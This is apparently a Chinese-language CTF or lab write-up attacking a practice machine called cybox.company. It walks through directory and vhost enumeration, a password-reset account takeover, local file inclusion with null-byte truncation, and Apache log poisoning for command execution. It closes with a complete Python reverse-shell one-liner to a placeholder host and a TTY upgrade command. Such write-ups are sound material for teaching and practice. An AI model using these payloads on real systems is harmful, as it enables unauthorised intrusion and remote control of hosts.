扫描可知开放的端口为：21、25、53、80、110、443、143端口，我们打开80端口查看

0x02 web信息收集

然后我们使用dirb进行目录扫描

dirb http://10.254.2.18

访问assets目录发现存在目录遍历，但是访问以后没有太多有价值的东西。访问phpmyadmin提示需要来源地址为：127.0.0.1

我们根据主页上的内容，发现有个子域名，我们加到hosts上去

我们可以尝试爆破一下子域名

gobuster vhost -u http://cybox.company -w /usr/share/wordlists/dirb/big.txt

发现多个子域名，依次加到hosts上

Found: dev.cybox.company (Status: 200) [Size: 209]

访问一下各个页面，看看有什么东西

0x03 web渗透

首先在http://monitor.cybox.company/register.php上注册一个账号

登陆后发现是一个创建条目记录时间的，没啥东西

然后我们退出登陆，试下一开始主页的邮箱。

发现密码不匹配，我们尝试一下不存在的用户，发现是没有找到此邮箱，说明用户admin是存在的，我们先放着。

下面有个忘记密码，想着之前不是发现有一个邮箱页面，可能可以用他找回密码。

我们先尝试用之前注册的账号登陆webmail页面

显示账号密码不匹配，说明这两个页面不是共用一个账户的。还记得我们还得到了一个register的页面，我们创建一个同名的账户

创建账户成功，然后账号密码都是相同的。我们登陆webmail页面发现登陆成功，然后在收件箱中我们可以找到找回密码的链接

我们可以修改一下邮件，把他邮箱号改成admin@cybox.company，看看是否为越权漏洞，发现还真可以

登陆后，发现有个admin控制面板

我们访问控制面板，发现还在开发中

查看源代码，发现有个文件有包含

我们尝试使用文件包含漏洞，显示出etc/passwd文件内容，直接访问的话是空白的，可能是拼接了啥后缀，我们使用00截断去截断后缀

然后我们查看一下apache日志文件

view-source:http://monitor.cybox.company/admin/styles.php?style=../../../../../../opt/bitnami/apache2/logs/access_log%00

看日志记录的都是ftp.cybox.company页面的请求信息，经过询问朋友得知，可以通过日志解析+文件包含漏洞执行命令并显示在日志上。（总的来说就是日志包含漏洞）接下来就是利用

我们随便刷新一下，burp拦截ftp页面，然后写上马

view-source:http://monitor.cybox.company/admin/styles.php?style=../../../../../../opt/bitnami/apache2/logs/access_log%00&s=ls

我们随便执行一个ls命令，发现居然可以解析

我们用python写一个反弹shell命令并执行：

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

然后反弹shell成功

最好升级一下shell会话，使用完全交互式TTY

python -c 'import pty; pty.spawn("/bin/bash")'
